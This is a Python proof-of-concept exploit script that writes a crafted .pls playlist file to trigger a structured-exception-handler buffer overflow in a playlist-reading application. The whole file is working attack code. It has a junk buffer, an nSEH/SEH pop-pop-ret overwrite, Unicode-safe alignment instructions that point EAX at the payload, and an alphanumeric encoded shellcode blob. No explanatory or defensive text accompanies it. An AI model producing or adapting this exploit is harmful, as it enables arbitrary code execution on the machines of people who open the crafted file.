#!/usr/bin/env python
# PoC7.py

header = "[playlist]\nNumberOfEntries=1\n\n"
header+= "File1="

totalsize = 5000
junk = "A"*4029
nseh = "\x42\x6d" # single byte op + nop/align <--|
seh  = "\x0e\x45" # pop-pop-ret ------------------+

# Put valid address from the stack into EAX
align = "\x58" # pop eax
align+= "\x6d" # nop/align
align+= "\x58" # pop eax
align+= "\x6d" # nop/align
align+= "\x58" # pop eax
align+= "\x6d" # nop/align
align+= "\x58" # pop eax
align+= "\x6d" # nop/align

# Increment EAX to point to the shellcode
align+= "\x05\x02\x11" # add eax,11000200
align+= "\x6d"         # nop/align
align+= "\x2d\x01\x11" # sub eax,11000100
align+= "\x6d"         # nop/align

# Jump to the shellcode
jump  = "\x50" # push eax
jump += "\x6d" # nop/align
jump += "\xc3" # ret

# Padding before shellcode
padding = "C"*105

# Venetian shellcode
shellcode = (
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAI"
"AXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLK84IKPM0K"
"PQP3YZENQ8R344KB2NPTK1BLLDKPRMDTKRRMXLOX7OZMVNQKONQ7PVLOL31CLLBNLO0GQX"
"OLMM1I7JBZPPRB74K22LP4KOROLM1Z04KOPSHU5Y02TPJKQ8PPPTKQ8N8TKPXMPKQ9C9SO"
"LPITK04TKKQIFNQKONQGPVL7QHOLMM1WWNX9PD5L4KS3MJXOKCMO445YRQHTK0XO4KQ8SC"
"64KLLPKDKPXMLKQ9C4KKTTKKQHPTIOTMTMTQKQKQQPYQJPQKOK0QH1OQJ4KN2ZK4FQM2JM"
"14M3U6YM0M0M0PPQXNQTKRO3WKOJ5GKZPVUVB26RHUVTUGMUMKO9EOLKVCLLJSPKKK0CEL"
"EGKQ7N32RROBJKPPSKOJ51SC12L2CKPA"
)

rest = "D"*(totalsize - len(junk + nseh + seh + align + jump + padding + shellcode))

payload = header + junk + nseh + seh + align + jump + padding + shellcode + rest + "\n"

f = open('playlist.pls','w')
f.write(payload)
f.close()
